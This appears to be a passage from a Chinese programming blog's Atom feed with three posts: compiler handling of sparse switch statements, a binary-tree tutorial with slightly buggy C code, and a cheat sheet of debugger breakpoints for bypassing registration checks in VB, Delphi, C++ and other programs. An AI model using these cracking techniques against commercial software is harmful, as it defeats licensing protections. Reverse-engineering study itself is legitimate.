id="4-对于毫无规律的情况。"><a href="#4-对于毫无规律的情况。" class="headerlink" title="4.对于毫无规律的情况。"></a>4.对于毫无规律的情况。</h1><strong>(1)通过上个例子的分析，我们大概可以猜出来，编译器会择优选择查表，查双表来对部分离得比较近的case项作处理，最后才考虑毫无规律的情况，为了提高我们这次测试的成功率，我们让每个相邻的case项差值都超过255，为了避免switch当做if来处理，我们多写几个case，具体代码段如下:</strong><br><pre><code><br>scanf(“%d”, &amp;nscore);<br>switch (nscore)<br>{<br> case 1:<pre><code>ntmpNum = 1;break;</code></pre> case 300:<pre><code>ntmpNum = 300;break;</code></pre> case 570:<pre><code>ntmpNum = 570;break;</code></pre> case 830:<pre><code>ntmpNum = 830;break;</code></pre> case 1094:<pre><code>ntmpNum = 1094;break;</code></pre> case 1314:<pre><code>ntmpNum = 32;break;</code></pre> case 1614:<pre><code> ntmpNum = 1614; break;case 1894: ntmpNum = 1894; break;</code></pre> case 2199:<pre><code> ntmpNum = 2199; break;case 2578:   ntmpNum = 2578; break;</code></pre> case 2800:<pre><code>ntmpNum = 2800;break;</code></pre> case 3178:<pre><code>ntmpNum = 3178;break;</code></pre> case 3568:<pre><code>ntmpNum = 3568;break;</code></pre> case 3856:<pre><code>ntmpNum = 3856;break;</code></pre> case 4212:<pre><code>ntmpNum = 4212;break;</code></pre> case 4679:<pre><code>ntmpNum = 4679;break;</code></pre> case 5050:<pre><code>ntmpNum = 5050;break;</code></pre> case 5486:<pre><code>ntmpNum = 5486;break;</code></pre> case 5797:<pre><code>ntmpNum = 5797;break;</code></pre> case 6089:<pre><code>ntmpNum = 6089;break;</code></pre> case 6713:<pre><code>ntmpNum = 6713;break;</code></pre> case 8425:<pre><code>ntmpNum = 8425;break;</code></pre> case 8973:<pre><code>ntmpNum = 8973;break;</code></pre> case 9545:<pre><code>ntmpNum = 9545;break;</code></pre> case 9987:<pre><code>ntmpNum = 9987;break;</code></pre> case 11254:<pre><code>ntmpNum = 11254;break;</code></pre> case 12489:<pre><code>ntmpNum = 12489;break;</code></pre> case 15798:<pre><code>ntmpNum = 15798;break;</code></pre> case 26874:<pre><code>ntmpNum = 26874;break;</code></pre> case 34721:<pre><code>ntmpNum = 34721;break;</code></pre> case 39681:<pre><code>ntmpNum = 39681;break;</code></pre> default:<pre><code>ntmpNum = 10;</code></pre>}<br>printf(“%d”, ntmpNum); // 要调用一下ntmpNum，否则上面的switch会被优化掉<br></code></pre><br>反汇编结果和上述理论一致。</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;暑假看了看雪的知识库，偶然间看到这篇besterChen写的switch结构分析一文，甚喜之，原封不动的抄了下来，在此表示非常感谢。这是在暑假的word版经过复核及重新测试，发现原文许多反汇编代码与原先语句有出入，可能是现在编译器更加高级了。为了保证原文的统一和完整性，在此没有对原文代码进行修改，只是在后面进行了补充，形式为图片类型。随后也会附上关于本次的测试样本（&lt;a href=&quot;http://pan.baidu.com/s/1gfo0ejx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1gfo0ejx&lt;/a&gt;），&lt;/strong&gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;switch 结构的逆向难度在于不同分支的switch通过反编译器可能演变成不同的汇编语言版本，这就要求逆向工程师精确掌握反汇编switch的规律。灵活的运用调试器进行调试。&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈数据结构之二叉树</title>
    <link href="http://yoursite.com/2017/11/05/%E6%B5%85%E8%B0%88%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://yoursite.com/2017/11/05/浅谈数据结构之二叉树/</id>
    <published>2017-11-05T10:45:11.000Z</published>
    <updated>2017-11-21T05:35:23.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="树的定义："><a href="#树的定义：" class="headerlink" title="树的定义："></a>树的定义：</h1><p>树是n（n&gt;=0）个节点的有限集合。当n==0时，称为空树，当n&gt;=0时，树满足以下条件：<br>    <strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（1）有且仅有一个称为根的特定节点，该节点没有前驱节点，有一个或者多个后继节点。</strong><br>    <strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（2） 除根节点以外的n-1个节点可以划分为m个互不相交的有限集合，该集合称之为树，即根的子树</strong><br><a id="more"></a></p><h1 id="二叉树的定义："><a href="#二叉树的定义：" class="headerlink" title="二叉树的定义："></a>二叉树的定义：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在计算机科学中，二叉树是每个节点最多有两个子树的树结构。通常子树被称作“左子树”（left subtree）和“右子树”（right subtree）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的每个结点至多只有二棵子树(不存在度大于2的结点)，二叉树的子树有左右之分，次序不能颠倒。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>二叉树的第i层至多有2^{i-1}个结点；深度为k的二叉树至多有2^k-1个结点；对任何一棵二叉树T，如果其终端结点数为n_0，度为2的结点数为n_2，则n_0=n_2+1。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>一棵深度为k，且有2^k-1个节点称之为满二叉树；深度为k，有n个节点的二叉树，当且仅当其每一个节点都与深度为k的满二叉树中，序号为1至n的节点对应时，称之为完全二叉树。</strong></p><h1 id="二叉树的存储结构："><a href="#二叉树的存储结构：" class="headerlink" title="二叉树的存储结构："></a>二叉树的存储结构：</h1><p><strong>1.顺序存储结构：</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于满二叉树和完全二叉树来说，按照满二叉树节点连续编号的次序，将各节点数据存放在一组连续的内存单元，即用一维数组作为存储结构。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;满足一下条件：<br><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1)左子树是双亲节点次序的2n倍</strong><br><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2)右子树是双亲节点次序的2n+1倍</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图所示，将二叉树按顺序结构存储：<br>     <img src="https://i.imgur.com/N43CGuq.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将这个二叉树按顺序结构存储：<br>     <img src="https://i.imgur.com/SjnBCZt.jpg" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的顺序存储模型的DAT描述如下：</p><pre><code>     typedef char datatype      typedef struct      {         datatype SqBiTree[MAXSIZE+1];         int nodemax;     }BiTree;</code></pre>**2.链式存储结构：**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的链式存储结构是指用链表来表示一棵二叉树，即用链来指示元素的逻辑关系。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的每个结点最多有两个孩子，因此，每个结点除了存储自身的数据外，还应设置两个指针分别指向左、右孩子结点。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图所示，将二叉树链式结构存储：    ![](https://i.imgur.com/EnR6Mhx.png)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;二叉树的链式存储模式的DAT描述：<pre><code>     typedef char datatype     typedef struct node     {          datatype data;          struct node *Lchild;           struct node *Rchild;    }</code></pre> # 二叉树的建立：<pre><code>    void CreateBiTree(BiTree &root)     //创建二叉树    {                                   //这里加上&意思是传递的参数为指针的引用，括号里面等价于 BiTreeNode* &T        char ch;        ch = getchar();        if ('#' == ch)            root = NULL;        else        {            root = (BiTree)malloc(sizeof(BiTree));            root->data = ch;            CreateBiTree(root->Lchild);            CreateBiTree(root->Rchild);        }    }</code></pre># 二叉树的遍历：<pre><code> 1）先序递归遍历：     void PreOrder(BiTree root)     {       if (root)       {          visit(root->data);          PreOrder(root->Lchild);          PreOrder(root->Rchild);       }     }</code></pre><pre><code> 2)中序递归遍历：    void InOrder(BiTree root)    {        if(root)        {                InOrder(root->LChild);            visit(root->data);            InOrder(root->RChild);        }    }</code></pre><pre><code> 2)后序递归遍历：    void PostOrder(BiTree root)    {        if(root)        {            PostOrder(root->Lchild);            PostOrder(root->RChild);            visit(root->data);        }    }</code></pre><pre><code> 2)先序非递归遍历：    void PreOrder(BiTree root)]    {        SeqStack *s;        InitStack(s);        BiTree p=root;        while(p!=NULL||s!=NULL)        {            while(p!=NULL)            {                visit(p->data);                Push(s,p);          //保存上一步节点信息，以便下次返回使用                p=p->LChild;            }            if(IsEmpty(s))            {                Pop(s,&p);                p=p->RChild;      //进入右子树，开始下一次循环            }            }    }</code></pre><pre><code>二叉树的层次遍历    void LevelOrder(BiTree root)    {        SeqQueue *q;        BiTree p;        InitQueue(q);        EnterQueue(q,root);        //人队列        while(!IsEmpty(q))        {            DeleteQueue(q,&p);   //出队列            visit(p);            if(p->Lchild)                EnterQueue(q,p);            if(p->Rchild)                EnterQueue(q,p);        }    }</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;树的定义：&quot;&gt;&lt;a href=&quot;#树的定义：&quot; class=&quot;headerlink&quot; title=&quot;树的定义：&quot;&gt;&lt;/a&gt;树的定义：&lt;/h1&gt;&lt;p&gt;树是n（n&amp;gt;=0）个节点的有限集合。当n==0时，称为空树，当n&amp;gt;=0时，树满足以下条件：&lt;br&gt;    &lt;strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（1）有且仅有一个称为根的特定节点，该节点没有前驱节点，有一个或者多个后继节点。&lt;/strong&gt;&lt;br&gt;    &lt;strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;（2） 除根节点以外的n-1个节点可以划分为m个互不相交的有限集合，该集合称之为树，即根的子树&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>六类语言的逆向思路</title>
    <link href="http://yoursite.com/2017/11/02/%E5%85%AD%E7%A7%8D%E5%B8%B8%E8%A7%81%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91%E6%80%9D%E8%B7%AF/"/>
    <id>http://yoursite.com/2017/11/02/六种常见语言的逆向思路/</id>
    <published>2017-11-02T12:45:11.000Z</published>
    <updated>2017-11-21T05:35:23.134Z</updated>
    
    <content type="html"><![CDATA[<h1 id="语言列表："><a href="#语言列表：" class="headerlink" title="语言列表："></a>语言列表：</h1><ul><li>VB        MASM32   </li><li>VC        BCB </li><li>易语言     Delphi<a id="more"></a></li></ul><h1 id="破解思路："><a href="#破解思路：" class="headerlink" title="破解思路："></a>破解思路：</h1><ul><li><font color="#DC143C">1.VB破解：</font><ul><li>1）VBExplorer查找按钮事件</li><li>2）有提示框则bp rtcMsgBox</li><li>3）通过：<pre><code>* bp __vbaStrCmp/__vbaStrComp/__vbaVarTstEq* bp __vbaStrCmp  （比较字符串）* bp __vbaStrComp （同上）</code></pre></li><li>4）万能断点法(816C24法)：<pre><code>* 注册验证程序可以用这个断点下断，一般离程序访问注册表很近：* bp __vbaStrToAnsi* 5F12堆栈调用</code></pre></li><li>总结：<ul><li>VB程序破解的关键跳转，一般与其它语言的不同,没有JPM XXXXXXX一般以 JE/JNE XXXXXXXXX 跳转记录一般不会很远(虽然是短距离跳转，但是关键就在这里，可以设置大量的信息) 。如果发现False/True 可能是关键点</li></ul></li></ul></li></ul><hr><ul><li><font color="#DC143C">2.易语言破解思路:</font><ul><li>1）信息框法:<ul><li>bp MessageBoxA(断对话框)</li></ul></li><li>2）字符串法<ul><li>查看易语言文本信息:bp GetProcessHeap F9运行4次，取消断点 执行ALT+F9 用户代码 F8单步走</li><li>或者在区段为”.data”/“.ecode”下断，运行</li></ul></li><li>3）窗口标题法 bp SetWindowTextA</li><li>4）F12堆栈调用<ul><li>0040C0CB=易语言.0040C0CB (ASCII “shaonanshaonvluntan”)</li></ul></li></ul></li></ul><hr><ul><li><font color="#DC143C">3.DELPHI破解:</font><ul><li>1）DEDE、PE Explorer ResScope作为强有力的辅助工具找按妞事件</li><li>2）Point-H法</li><li>3）bp GetDlgItem/GetDlgItemTextA(断输入框)</li><li>4）bp MessageBoxA(W)(断对话框)—Ctrl+N</li><li>5）字符串法—插件/搜索所有参考文本</li><li>6）如果程序界面标题有[未注册/注册/VIP版/标准版/钻石版] 之类字样的<br>　　可以通过查找FormCreate/FormShow—-DEDE，找到关键标志位!<br>　　 来判断程序怎么样的判断是否注册或者用户类型</li><li>7）窗口标题法 bp SetWindowTextA</li><li>8）F12堆栈调用</li><li>9) 注册表:</li><li>10)特殊断点：<ul><li>bpx RegCreateKeyExA 对于Delphi程序程序来说，用这个断点比较合适</li><li>bp RegCreateKeyExA 对于加了壳的程序</li></ul></li></ul></li></ul><hr><ul><li><font color="#DC143C">4.C+破解.C类</font><ul><li>1）Point-H法<br>　　bp GetDlgItem(断按下按钮)<br>　　bp MessageBoxA(断对话框)</li><li>2）字符串法</li><li>3）F12堆栈调用</li><li>4）窗口标题法 bp SetWindowTextA</li><li>5）★★C+程序专用断点★★<ul><li>bp lstrcmpA (KERNEL32.lstrcmpA) 比较用法</li><li>bp _mbscmp //比较</li></ul></li><li>6）C类程序的经典断点:<ul><li>bp GetWindowTextA(断按下按钮) //也是适用于其它语言</li><li>bp GetWindowTextLengthA(断按下按钮) //也是适用于其它语言</li><li>bp GetDlgItem(断按下按钮) //也是适用于其它语言</li><li>bp GetDlgItemTextA</li><li>ds:[004021C8]=77C01881 (msvcrt._mbscmp)</li></ul></li></ul></li></ul><hr><ul><li><font color="#DC143C">5.BC++破解</font><ul><li>1）DEDE、PE Explorer作为强有力的辅助工具找按妞事件</li><li>2）Point-H法</li><li>3）bp GetDlgItem/GetDlgItemTextA(断输入框)</li><li>4）bp MessageBoxA(W)(断对话框)—Ctrl+N</li><li>5）字符串法—插件/搜索所有参考文本</li><li>6）如果程序界面标题有[未注册/注册/VIP版/标准版/钻石版] 之类字样的可以通过查找FormCreate/FormShow—-DEDE，找到关键标志位!来判断程序怎么样的判断是否注册或者用户类型</li><li>7）窗口标题法 bp SetWindowTextA</li><li>8）F12堆栈调用</li><li>9) bpx RegCreateKeyExA 对于Delphi程序程序来说，用这个断点比较合适<br>bp RegCreateKeyExA 对于加了壳的程序</li></ul></li></ul><hr><ul><li><font color="#DC143C">6.MASM32 / TASM32破解</font><ul><li>1）Point-H法<ul><li>bp GetDlgItem(断按下按钮)</li><li>bp MessageBoxA(断对话框)</li></ul></li><li>2）字符串法</li><li>3）F12堆栈调用</li><li>4）窗口标题法 bp SetWindowTextA</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;语言列表：&quot;&gt;&lt;a href=&quot;#语言列表：&quot; class=&quot;headerlink&quot; title=&quot;语言列表：&quot;&gt;&lt;/a&gt;语言列表：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;VB        MASM32   &lt;/li&gt;
&lt;li&gt;VC        BCB &lt;/li&gt;
&lt;li&gt;易语言     Delphi
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
</feed>
